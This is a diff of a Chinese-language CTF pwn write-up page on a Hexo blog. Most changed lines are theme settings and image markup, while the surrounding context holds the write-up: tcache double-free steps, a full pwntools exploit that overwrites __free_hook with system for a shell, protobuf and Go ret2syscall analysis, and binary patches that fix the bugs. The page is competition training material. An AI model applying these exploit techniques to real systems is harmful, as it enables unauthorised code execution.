@@ -35,7 +35,7 @@
     <script class="keep-theme-configurations">
     const KEEP = window.KEEP || {}
     KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
-    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Zach0ry's home","author":"Zach0ry","avatar":"/images/av.jpg","logo":"/images/123.png","favicon":"/images/123.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":false,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":false,"preload":false},"comment":{"enable":true,"use":"giscus","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":"zach0ry-zzh/zach0ry-zzh.github.io","repo_id":"R_kgDOPKvC2Q","category":"Comments","category_id":"DIC_kwDOPKvC2c4DByYU","reactions_enabled":true},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Zach0ry's home","author":"Zach0ry","avatar":"/images/av.jpg","logo":"/images/123.png","favicon":"/images/123.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":true,"post_datetime":"created"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":true,"reward":{"enable":true,"img_link":"/images/zfb.jpg","text":"请作者喝杯咖啡","icon":"/images/tea.svg"}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":false,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"giscus","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":"zach0ry-zzh/zach0ry-zzh.github.io","repo_id":"R_kgDOPKvC2Q","category":"Comments","category_id":"DIC_kwDOPKvC2c4DByYU","reactions_enabled":true},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":true},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
     KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
     KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
@@ -45,6 +45,8 @@
 
 <body>
 <div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
     
 
     
@@ -119,9 +121,15 @@
                         </li>
                     
                     
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
                 </ul>
             </div>
             <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                 
                 <div class="icon-item menu-bar">
                     <div class="menu-bar-middle"></div>
@@ -276,6 +284,10 @@
         
         
         
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
     </div>
 
     
@@ -297,12 +309,22 @@
 <h3 id="lonelywolf"><a href="#lonelywolf" class="headerlink" title="lonelywolf"></a>lonelywolf</h3><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>先改key构造double free,让fd指针指向该tcache,去泄露heap_base</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add(0x70)</span><br><span class="line">delete()</span><br><span class="line">edit(b&quot;a&quot;*0x10)</span><br><span class="line">delete()</span><br><span class="line"># dbg()</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(b&quot;Content: &quot;)</span><br><span class="line">heap_addr=u64(p.recv(6).ljust(8,b&quot;\x00&quot;))-0x250</span><br><span class="line">print(hex(heap_addr))</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260212151721801.png"  alt="image-20260212151721801"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260212151721801.png"
+                        alt="image-20260212151721801"
+                 ></p>
 <p>改next指针，取heap_base处的chunk,改struct的表的结构，伪造tcache都是满的，再free让函数进unsorted bin,</p>
 <p>拿到libc_base</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">edit(p64(heap_addr))</span><br><span class="line">add(0x70)</span><br><span class="line">add(0x70)</span><br><span class="line">edit(b&quot;a&quot;*0x40)</span><br><span class="line">delete()</span><br><span class="line">show()</span><br><span class="line"># dbg()</span><br><span class="line">libc_base=u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))-0x3ebca0</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">one_gadget = libc_base + 0x10a41c</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260212152522616.png"  alt="image-20260212152522616"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260212152522616.png"
+                        alt="image-20260212152522616"
+                 ></p>
 <p>通过这个unsorted改struct上的next指针（tcache bin不校验）为free_chunk的地址，把free_chunk覆盖为one_gadget</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">edit(b&#x27;\x03&#x27;+b&#x27;\x00&#x27;*0x3f+p64(free_hook))</span><br><span class="line">add(0x10)</span><br><span class="line">edit(p64(one_gadget))</span><br><span class="line">delete()</span><br></pre></td></tr></table></figure>
 
@@ -320,9 +342,19 @@
 <h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">file_path = &quot;./note&quot;</span><br><span class="line">remote_host = &quot;192.168.137.1&quot;</span><br><span class="line">remote_port = 2121</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">context.terminal = [</span><br><span class="line">    &quot;wt.exe&quot;, &quot;--profile&quot;, &quot;WSL GDB (Black)&quot;,</span><br><span class="line">    &quot;wsl.exe&quot;, &quot;bash&quot;, &quot;-ic&quot;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">if &#x27;re&#x27; in sys.argv:</span><br><span class="line">    p = remote(remote_host, remote_port)</span><br><span class="line">else:</span><br><span class="line">    p = process(file_path)</span><br><span class="line">    # gdb.attach(p)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">def sla(a, b):p.sendlineafter(a, b)</span><br><span class="line">def sa(a, b):p.sendafter(a, b)</span><br><span class="line">def ru(a):return p.recvuntil(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    sla(b&quot;5. exit\n&quot;, b&quot;1&quot;)</span><br><span class="line">    sla(b&quot;content: \n&quot;, str(size).encode())</span><br><span class="line">    sla(b&quot;content: \n&quot;, content)</span><br><span class="line"></span><br><span class="line">def edit(index, content):</span><br><span class="line">    sla(b&quot;5. exit\n&quot;, b&quot;2&quot;)</span><br><span class="line">    sla(b&quot;index: \n&quot;, str(index).encode())</span><br><span class="line">    sla(b&quot;content: \n&quot;, str(len(content)).encode())</span><br><span class="line">    sa(b&quot;Content: \n&quot;, content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    sla(b&quot;5. exit\n&quot;, b&quot;3&quot;)</span><br><span class="line">    sla(b&quot;index: \n&quot;, str(index).encode())</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    sla(b&quot;5. exit\n&quot;, b&quot;4&quot;)</span><br><span class="line">    sla(b&quot;index:&quot;, str(index).encode())</span><br><span class="line"></span><br><span class="line">for _ in range(10):</span><br><span class="line">    add(0x80,b&quot;/bin/sh\x00&quot;)</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    delete(7-i)</span><br><span class="line"># dbg()</span><br><span class="line">show(0)</span><br><span class="line">libc_base=u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))-0x1ecbe0</span><br><span class="line">print(hex(libc_base))</span><br><span class="line"></span><br><span class="line">edit(1,p64(libc_base+libc.sym[&quot;__free_hook&quot;]))</span><br><span class="line"># dbg()</span><br><span class="line">add(0x80,b&quot;1111&quot;)</span><br><span class="line">add(0x80,p64(libc_base + libc.sym[&#x27;system&#x27;]))</span><br><span class="line">delete(8)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <h3 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h3><p>直接把call free给nop掉</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260222160215265.png"  alt="image-20260222160215265"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260222160215265.png"
+                        alt="image-20260222160215265"
+                 ></p>
 <p>应用patch</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260222160435175.png"  alt="image-20260222160435175"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260222160435175.png"
+                        alt="image-20260222160435175"
+                 ></p>
 <h2 id="protoverflow"><a href="#protoverflow" class="headerlink" title="protoverflow"></a>protoverflow</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><strong>1）建 .&#x2F;lib 并把“必须文件”放进去</strong></p>
 <p>先去2.27-3ubuntu1.6中拿到对应的ld文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p lib</span><br><span class="line"></span><br><span class="line">cp -f libc-2.27.so lib/</span><br><span class="line">cp -f libprotobuf.so.10 lib/</span><br><span class="line">cp -f ld-2.27.so lib/</span><br><span class="line"></span><br><span class="line">ln -sf libc-2.27.so lib/libc.so.6# 程序要找的是 libc.so.6，不是 libc-2.27.so改名</span><br><span class="line">chmod +x lib/ld-2.27.so pwn</span><br></pre></td></tr></table></figure>
@@ -377,12 +409,22 @@
 
 
 <p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/15171" >protobuf-pwn利用-先知社区<i class="fas fa-external-link-alt"></i></a></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260222170232392.png"  alt="image-20260222170232392"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260222170232392.png"
+                        alt="image-20260222170232392"
+                 ></p>
 <p>序列化之后的proto就是我们的<strong>unk_209080</strong></p>
 <p>本题真正的入口不是main，而是ParseFromArray，只有 <strong>Parse 成功</strong> 才会进入 <code>sub_324A()</code>，如果不能构造“合法 protobuf”，就永远进不了漏洞函数</p>
 <p><code>v5 = google::protobuf::MessageLite::ParseFromArray(&amp;unk_209080, s, v6);</code></p>
 <p>从字节数组 s 中读取 v6 个字节，并将解析得到的消息存储到 unk_209080中。如果解析成功， ParseFromArray将返回true；</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260225161941674.png" ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260225161941674.png"
+                       
+                 ></p>
 <p>检验函数sub_324A，打ret2libc就好</p>
 <blockquote>
 <p><code>LD_LIBRARY_PATH=. ./pwn</code></p>
@@ -391,12 +433,22 @@
 </blockquote>
 <p>执行<code>./gui.py</code>提取</p>
 <p><strong>PBTK擅长提取二进制里保留了完整的 protobuf 描述信息</strong></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260225144635634.png"  alt="img"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260225144635634.png"
+                        alt="img"
+                 ></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">执行`./gui.py`提取</span><br><span class="line"></span><br><span class="line">syntax = &quot;proto2&quot;;</span><br><span class="line"></span><br><span class="line">message protoMessage &#123;</span><br><span class="line">    optional string name = 1;        // 可有可无：字符串</span><br><span class="line">    optional string phoneNumber = 2; // 可有可无：字符串</span><br><span class="line">    required bytes buffer = 3;       // 必须有：任意字节</span><br><span class="line">    required uint32 size = 4;        // 必须有：32位无符号整数</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><code>protoc --python_out=. message.proto</code>编译出可以导入到python的文件</p>
 <p>(默认输出到&#x2F;home&#x2F;p0ach1l&#x2F;.pbtk&#x2F;)</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260225145232384.png"  alt="image-20260225145232384"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260225145232384.png"
+                        alt="image-20260225145232384"
+                 ></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import message_pb2#导入</span><br></pre></td></tr></table></figure>
 
 <p>exp</p>
@@ -406,14 +458,24 @@
 
 
 <h3 id="patch-1"><a href="#patch-1" class="headerlink" title="patch"></a>patch</h3><p>思路，把size改小，让它无法溢出就好</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260225170149606.png"  alt="image-20260225170149606"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260225170149606.png"
+                        alt="image-20260225170149606"
+                 ></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov edx, dword ptr [rbp+n]   ; 3字节</span><br><span class="line">mov edx, 200h                ; 5字节</span><br></pre></td></tr></table></figure>
 
 <p>所以要跳转到其它段去操作</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x0331B:</span><br><span class="line">	jmp eh_frame</span><br><span class="line">	nop ;nop来补齐六个字节</span><br><span class="line"></span><br><span class="line">eh_frame:(0x6243)</span><br><span class="line">	mov edx,0x200 ;设置size参数为0x200</span><br><span class="line">	mov rcx, [rbp-8] ;还原被覆盖的指令</span><br><span class="line">	jmp 0x3322 ;跳转回去</span><br></pre></td></tr></table></figure>
 
 <p>（0，0x8000]有可执行权限（可以多去看看.eh_frame<code>/</code>.eh_frame_hdr）</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260226182505253.png"  alt="image-20260226182505253"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260226182505253.png"
+                        alt="image-20260226182505253"
+                 ></p>
 <blockquote>
 <h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><ul>
 <li>连续 <code>\x00</code>（最常见）</li>
@@ -422,13 +484,33 @@
 </ul>
 <p><strong>长度要求</strong>：至少 14 字节（你当前 trampoline 是 14 字节），建议找 ≥ 0x20 更稳。</p>
 </blockquote>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260226182038323.png"  alt="image-20260226182038323"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260226182038323.png"
+                        alt="image-20260226182038323"
+                 ></p>
 <p>选取位置0x6243</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260226182104102.png"  alt="image-20260226182104102"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260226182104102.png"
+                        alt="image-20260226182104102"
+                 ></p>
 <p>patch之后</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260226182301882.png"  alt="image-20260226182301882"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260226182301882.png"
+                        alt="image-20260226182301882"
+                 ></p>
 <p>因为跳转的指令把下一个条mov的指令也给覆盖了，所以在跳转之后要再加上</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260226182211604.png"  alt="image-20260226182211604"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260226182211604.png"
+                        alt="image-20260226182211604"
+                 ></p>
 <p>最后记得保存patch就好</p>
 <p>（0，0x8000]有可执行权限（可以多去看看.eh_frame<code>/</code>.eh_frame_hdr）</p>
 <blockquote>
@@ -439,8 +521,18 @@
 </ul>
 <p><strong>长度要求</strong>：至少 14 字节（你当前 trampoline 是 14 字节），建议找 ≥ 0x20 更稳。</p>
 </blockquote>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260226180632137.png"  alt="image-20260226180632137"></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260226181124049.png"  alt="image-20260226181124049"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260226180632137.png"
+                        alt="image-20260226180632137"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260226181124049.png"
+                        alt="image-20260226181124049"
+                 ></p>
 <h2 id="go-note"><a href="#go-note" class="headerlink" title="go_note"></a>go_note</h2><h3 id="go基础"><a href="#go基础" class="headerlink" title="go基础"></a>go基础</h3><table>
 <thead>
 <tr>
@@ -529,8 +621,18 @@
 <p>定位入口</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go tool nm note | grep &#x27;main\.&#x27;</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260228145449814.png"  alt="image-20260228145449814"></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260228150905908.png"  alt="image-20260228150905908"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260228145449814.png"
+                        alt="image-20260228145449814"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260228150905908.png"
+                        alt="image-20260228150905908"
+                 ></p>
 <p>最后gdb调试发现edit不限制输入</p>
 <p>但是其实也有一个静态的插件</p>
 <p><a class="link"   target="_blank" rel="noopener" href="https://github.com/mandiant/GoReSym/releases" >GoReSym<i class="fas fa-external-link-alt"></i></a></p>
@@ -540,14 +642,34 @@
 <p><code>with open(json_path, &#39;r&#39;) as rp:</code></p>
 <p>修改为（增加 <code>encoding=&#39;utf-8-sig&#39;</code>）： <code>with open(json_path, &#39;r&#39;, encoding=&#39;utf-8-sig&#39;) as rp:</code></p>
 <p>在ida中<strong>File</strong> -&gt; **Script file.**选择依次选择脚本和json文件得到</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260228174727983.png" ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260228174727983.png"
+                       
+                 ></p>
 <p>找偏移 64&#x3D;0x40</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260228180753812.png"  alt="image-20260228180753812"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260228180753812.png"
+                        alt="image-20260228180753812"
+                 ></p>
 <p>且  _OWORD v11[2]; &#x2F;&#x2F; [rsp+0h] [rbp-40h] BYREF，存在栈溢出</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260228174918362.png" ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260228174918362.png"
+                       
+                 ></p>
 <p>但是开启了NX保护，shellcode不行，考虑ret2syscall</p>
 <p>查找syscall</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260228175443476.png" ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260228175443476.png"
+                       
+                 ></p>
 <p>execve(rbx&#x3D;”&#x2F;bin&#x2F;sh”, rcx&#x3D;0, rdi&#x3D;…)</p>
 <p>并且下面部分还有个rcx置零指令</p>
 <p>查找相关寄存器操作指令</p>
@@ -555,13 +677,28 @@
 <p>字符串放置用mov [eax], edx</p>
 <p><code>ROPgadget --binary ./note | grep -E &quot;mov .*\\[e?rax\\].*edx&quot;</code></p>
 <p>每次只能存储4个字节</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260228184654263.png"  alt="image-20260228184654263"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260228184654263.png"
+                        alt="image-20260228184654263"
+                 ></p>
 <p>bss找一个rw段</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260228183256024.png"  alt="image-20260228183256024"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260228183256024.png"
+                        alt="image-20260228183256024"
+                 ></p>
 <h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 